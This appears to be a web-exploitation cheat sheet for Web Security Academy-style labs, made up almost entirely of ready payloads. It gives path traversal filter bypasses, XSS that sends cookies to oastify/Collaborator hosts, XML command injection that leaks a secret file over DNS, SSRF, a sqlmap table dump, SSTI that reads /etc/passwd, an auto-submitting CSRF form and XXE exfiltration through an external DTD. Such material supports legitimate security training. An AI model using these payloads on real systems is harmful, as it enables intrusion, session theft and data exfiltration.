Path traversal bypass filter
```
%252f..%252f..%252fhome/carlos/secre%2574 
```

Reflected XSS bypass filter

```html
\'</ScRiPt ><img src=a onerror="window.location=`http://BURP-DOMAIN/?cookie=`+document.cookie">
```

or

```
\'</ScRiPt><img src=x onerror="window.location=`http://d7lk443a3qapex6cepn5sp8lico2cr.oastify.com/?x=`+document.cookie">
```

POC
```
<script>document.location="https://0a0f009c03cfc7b6c0f9a82500460045.web-security-academy.net/?lookup=\'</ScRiPt ><img src=a onerror="window.location=`http://66aelmwr5xbnmfugwm5586nkrbx5lu.oastify.com/?cookie=`+document.cookie">"</script>
```
or `document=`, `location.href=`

CMDi in XML format

```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>example1</username>
        <email>example1@domain.com`ping \`cat /home/carlos/secret\`.BURP-COLLAB-DOMAIN`</email>
    </user>
</users>
```
OR

```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example111</username>
        <email>examp1le1@domain.com</email>
    </user>
    <user>
        <username>Example222</username>
        <email>examp1wle2@domain.com `ping \`cat /home/carlos/secret\`.eq8n3iddz9uwkrrau8vlxw9z1q7hv6.oastify.com`</email>
    </user>
</users>
```
SSRF in export PDF

```
<iframe src=\"http://localhost:6566/\" width=1000px height=1000px>
```

sqlmap

```
sqlmap.py -u "<URL>" --cookie="<cookies>" --batch --random-agent -v --level=2 -D public --tables -T users –dump
```

Note: remember to place `*` into vulnerability parameter

SSTI read file

```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```
CSRF bypass Referrer header

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <meta name="referrer" content="no-referrer">
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ace00da03718c7cc099cc11000700ab.web-security-academy.net/my_account/change_email" method="POST">
      <input type="hidden" name="email" value="adminbbbbb@exploit-0a2e009d03ea8c98c0a4cc1d011f00fd.exploit-server.net" />
      <input type="hidden" name="form&#45;id" value="7xsaC9" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

XXE with external dtd

self host dtd file

```
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exf SYSTEM 'BURP-COLLAB-DOMAIN/?x=%file;'>">
%eval;
%exf;
```

Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0acc000a049bd2aec0ca109201ff0073.exploit-server.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com</email>
    </user>
</users>
```
